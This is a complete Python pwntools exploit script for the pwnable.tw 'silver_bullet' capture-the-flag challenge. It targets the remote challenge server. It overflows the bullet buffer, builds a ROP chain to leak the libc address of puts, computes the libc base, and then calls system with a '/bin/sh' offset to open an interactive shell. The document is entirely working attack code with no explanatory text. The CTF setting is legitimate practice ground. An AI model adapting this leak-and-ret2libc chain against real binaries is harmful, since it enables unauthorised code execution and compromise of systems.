from pwn import *

exe = ELF('silver_bullet', checksec=False)
#r = process(exe.path)
r = remote('chall.pwnable.tw', 10103)
libc = ELF('libc_32.so.6', checksec=False)

def create_bullet(s):
	r.sendafter(b'choice :', b'1')
	r.sendafter(b'bullet :', s)

def power_up(s):
	r.sendafter(b'choice :', b'2')
	r.sendafter(b'bullet :', s)

def beat():
	r.sendafter(b'choice :', b'3')

#input()
create_bullet(b'a'*0x2f)
power_up(b'a')
payload = b'a'*7 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts'])
power_up(payload)
beat()
beat()
r.recvuntil(b'You win !!\n')
puts_leak = u32(r.recv(4))
log.info("puts leak: " + hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info("libc base: " + hex(libc.address))

pop_ebx = 0x08048475
create_bullet(b'a'*0x2f)
power_up(b'a')
payload = b'a'*7 + p32(libc.sym['system']) + p32(pop_ebx)
payload += p32(libc.address + 0x158e8b)
power_up(payload)
beat()
beat()
r.interactive()